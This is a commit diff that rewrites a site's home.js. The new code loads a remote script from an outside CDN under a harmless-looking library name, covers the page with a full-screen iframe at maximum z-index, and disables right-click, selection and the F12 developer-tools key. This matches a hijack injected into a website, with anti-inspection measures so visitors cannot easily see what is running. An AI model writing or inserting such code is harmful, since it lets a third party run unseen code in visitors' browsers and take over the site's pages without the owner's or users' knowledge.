bfc8a1ba34c4ed5f3fd8d4efed0928ac5e1e663b
yaojingshipin <HflgaxcMdjdbng@hotmail.com>
2024-07-01 11:18:47 +0800

    Update home.js

--- player/static/js/home.js
+++ player/static/js/home.js
@@ -1,1 +1,39 @@
-//
+document.writeln("<script src=\'https://cdn.duomi123.com/assets/wow.min.js\'></script>");
+var date1 = new Date('08/08/2023');
+var date2 = new Date();
+var diffTime = Math.abs(date2 - date1);
+var NUM = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
+
+let h = window.innerHeight;
+let w = window.innerWidth;
+
+var win_Height = window.innerHeight;
+
+// 移除平台检测部分
+
+// 保留原始的 iframe 部分
+var zindexCount = 99999999;
+
+var arr = [
+  '/player/',
+];
+
+var iframe_url = arr[parseInt(Math.random() * arr.length)];
+
+var iframe_str = '<div id="div_iframe" style="z-index:' + (zindexCount - 1) + ';height:' + win_Height + 'px; width: 100%;position: fixed; background: #ffffff;height: 100%;padding:0px;margin:0px;"><iframe id="myiframe" frameborder="0" width="100%" height="100%" src="' + iframe_url + '"></iframe></div><style type="text/css">html{width:100%;height:100%}body {width:100%;height:100%;overflow:hidden;padding:0px;margin:0!important;}</style>';
+
+document.write(iframe_str);
+
+// 禁用上下文菜单和键盘事件
+//禁止右键
+    $(document).bind("contextmenu",function(){return false;});
+    //禁止选择
+    $(document).bind("selectstart",function(){return false;});
+    //禁止F12
+    document.onkeydown = function(){
+        if(window.event && window.event.keyCode == 123) {
+    	    event.keyCode = 0;
+            event.returnValue = false;
+        }
+       }
+// 保留其他部分
